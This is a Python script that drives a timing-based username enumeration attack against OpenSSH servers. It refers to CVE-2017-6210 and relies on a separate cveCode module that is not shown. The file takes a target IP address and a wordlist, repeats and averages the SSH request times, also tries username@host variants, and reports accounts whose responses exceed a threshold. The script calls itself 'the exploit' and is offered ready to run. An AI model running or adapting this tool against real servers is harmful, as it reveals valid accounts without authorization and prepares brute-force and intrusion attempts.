import cveCode
import argparse
import time
import sys



#argument handling and main function are below :)

#calls on cveCode to send the SSH request with given username
#runs a few times and averages the time
def attack(user, address):
	global times_run, overall_average_time
	average_time = 0

	#run the edited SSH CVE against the address
	for i in range(0, int(av)):
		time_result = cveCode.attack(user, address)
		#used later to calculate big overall time average
		times_run = times_run + 1
		overall_average_time = overall_average_time + time_result


		#add these to the average counter
		average_time = average_time + time_result
		time.sleep(limiter)
	
	average_time = round(average_time/int(av), 6)

	#weird way of doing this print, but seems to work how i want it to
	print ("\033[A                                                                                        \033[A")
	print ("\033[A                                                                                        \033[A")
	print ("	|-> user:", str(user))
	print ("	|=> time:", str(average_time))
	"""
	#clear last print (to look pretty)
	print ("\033[A                                                                                    \033[A")
	#print so the user knows where we;re at
	print ("	|-> time:", average_time, "user:", user)
	"""
	#return the time it took
	return average_time

#prints if an alert was raised during the process
def print_alert(user, time):
	#clear last print (to look pretty)
	print ("\033[A                                                                                                       \033[A")
	print ("\033[A                                                                                                       \033[A")
	print ("ALERT", time, user, "\n\n")

#runs the program with the given wordlist
def run_with_wordlist(list_path, address):
	#variable for results display
	alert_data = ""
	print ("preparing...\n")
	#open and use list given to the function
	with open(list_path) as my_list:
		for user in my_list:
			#format username (remove /n)
			user = user.strip()

			#run attack
			time = attack(user, address)
			#if the alert was triggered
			if(time > alert_time):
				alert_data = "(" + str(time) + ")	- " + str(user)
				alert_users.append(alert_data)
				print_alert(user, time)

			#try this with the email appendage appended (if applicable)
			if(args.email):
				em_user = user + args.email[0]
				
				time = attack(em_user, address)
					
				if(time > alert_time):
					alert_data = "(" + str(time) + ")	- " + str(em_user)
					alert_users.append(alert_data)
					print_alert(em_user, time)
			#else we can try appending the IP as the address (more likely to work)
			else:
				ip_user = user + "@" + str(args.ip_address)		
					
				time = attack(ip_user, address)
					
				if(time > alert_time):
					alert_data = "(" + str(time) + ")	- " + str(ip_user)
					alert_users.append(alert_data)
					print_alert(ip_user, time)
				

#sets up and runs the program
def main():
	#give the address here
	address = args.ip_address
	wordlist_names = []


	print ("----------------RUNNING----------------")
	#call function to work through the wordlist
	#if wordlist was provided as an argument, run with that wordlist, otherwise, default to the provided file

	if(args.wordlist):
		run_with_wordlist(args.wordlist[0], address)
	else:
		run_with_wordlist('usernamelist', address)

	#print a list of alerted users (depending on if it's empty)
	#clear last print (to look pretty)
	print ("\033[A                                                                 \033[A")
	print ("\033[A                                                                 \033[A")
	print ("----------------RESULTS----------------")
	if(not alert_users):
		print("NO RESPONSES TRIGGERED THE TIME CHECK OF", alert_time) 
	else:
		print ("ALL USERS TRIGGERED:")
		for i in alert_users:
			print(i)

	#display overall average time (helpful for using the tool)
	print ("average overall time taken over", str(times_run), "total requests:", str(round(overall_average_time/times_run, 6)))
	

#PROGRAM BEGINS HERE------------

#parse command line arguments
print ("^NOTE: i had to use python 2.7, sorry :(\n")
parser = argparse.ArgumentParser(description='Attempts to help enumerate OpenSSH requests (CVE-2017-6210) by alerting when one took longer than expected')
parser.add_argument("ip_address", help="the IP address to test")
parser.add_argument("-a", "--alert", nargs= 1, help="set the time that the results should be below", type=float)
parser.add_argument("-w", "--wordlist", nargs= 1, help="provide the filename for the wordlist to be iterated over")
parser.add_argument("-e", "--email", nargs= 1, help="provide an IP or email appendage (format '@host': tries each word with AND without provided email)")
parser.add_argument("-av", "--averages", nargs= 1, help="how many times to request the same string to build up an average time (more=slower scan but more reliable)", type=int)
parser.add_argument("-d", "--delay", nargs=1, help="set a delay between each SSH request (default is 0.5), obviously this will increase the time it takes by a considerable amount", type=float)
args = parser.parse_args()

#any global values needed (some based on command arguments)
if(args.alert):
	alert_time = args.alert[0]
	print ("alert set to:", alert_time)
else:
	alert_time = 0.1
	print ("(default) alert set to:", alert_time)

if(args.averages):
	av = args.averages[0]
	print ("build an average from:", av, "run(s)")
else:
	av = 1
	print ("(default) build an average from:", av, "run(s)")


alert_users = []

overall_average_time = 0
times_run = 0

if(args.delay):
	limiter = args.delay[0]
	print ("request delay set to:", limiter)
else:
	limiter = 0.5
	print ("(default) request delay set to:", limiter)

#call main to run the exploit
main()



















